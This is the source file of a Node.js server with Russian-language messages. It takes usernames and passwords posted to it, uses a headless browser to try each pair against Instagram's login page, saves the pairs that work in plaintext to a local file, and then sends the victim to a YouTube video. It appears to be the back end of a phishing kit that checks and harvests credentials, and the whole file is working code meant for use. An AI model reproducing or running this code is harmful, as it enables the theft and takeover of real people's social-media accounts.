const Fastify = require("fastify");
const { chromium } = require("playwright");
const fs = require("fs");
const cors = require("@fastify/cors");

const PORT = process.env.PORT || 3000;
const DATA_FILE = "valid_credentials.json";

const app = Fastify();
app.register(cors);

function validateCredentials(username, password) {
    if (!username || !password) {
        return { valid: false, message: "Логин и пароль обязательны!" };
    }
    if (password.length < 6) {
        return { valid: false, message: "Пароль должен быть минимум 6 символов." };
    }
    const usernameRegex = /^[a-zA-Z0-9._]+$/;
    if (!usernameRegex.test(username)) {
        return { valid: false, message: "Логин должен содержать только буквы, цифры и точки/подчеркивания." };
    }
    return { valid: true };
}

function saveCredentials(username, password) {
    let credentials = [];
    if (fs.existsSync(DATA_FILE)) {
        credentials = JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));
    }
    credentials.push({ username, password });
    fs.writeFileSync(DATA_FILE, JSON.stringify(credentials, null, 2));
}

app.post("/check", async (request, reply) => {
    console.log("Новый POST-запрос на /check", request.body);

    const { username, password } = request.body;
    const validation = validateCredentials(username, password);
    if (!validation.valid) {
        console.log("Ошибка валидации:", validation.message);
        return reply.send({ error: true, message: validation.message });
    }

    console.log(`Начинаем проверку логина для пользователя: ${username}`);

    const browser = await chromium.launch({ headless: true });
    const page = await browser.newPage();

    try {
        await page.goto("https://www.instagram.com/accounts/login/");
        await page.waitForSelector("input[name='username']", { timeout: 5000 });
        await page.fill("input[name='username']", username);
        await page.fill("input[name='password']", password);
        await page.click("button[type='submit']");
        await page.waitForTimeout(5000);

        const errorMessage = await page.locator("div.xkmlbd1").count();
        if (errorMessage > 0) {
            await browser.close();
            return reply.send({ error: true, message: "Неверный логин или пароль" });
        }

        let loginSuccess = false;
        for (let i = 0; i < 10; i++) {
            await page.waitForTimeout(1000);
            if (page.url() !== "https://www.instagram.com/accounts/login/") {
                loginSuccess = true;
                break;
            }
        }

        if (loginSuccess) {
            saveCredentials(username, password);
            const redirectUrl = "https://www.youtube.com/watch?v=fi5-Q84I-RU&list=RD35EiSTCF0DY&index=10";
            await browser.close();
            return reply.send({ error: false, message: "Успешный вход в Instagram", redirectUrl });
        } else {
            await browser.close();
            return reply.send({ error: true, message: "Неверный логин или пароль" });
        }
    } catch (error) {
        console.error("Ошибка при входе в Instagram:", error);
        await browser.close();
        return reply.send({ error: true, message: "Ошибка сервера" });
    }
});

app.get("/", async (request, reply) => {
    reply.send("Сервер работает!");
});

app.listen({ port: PORT, host: "0.0.0.0" }, (err, address) => {
    if (err) {
        console.error("Ошибка запуска сервера:", err);
        process.exit(1);
    }
    console.log(`Сервер запущен на ${address}`);
});
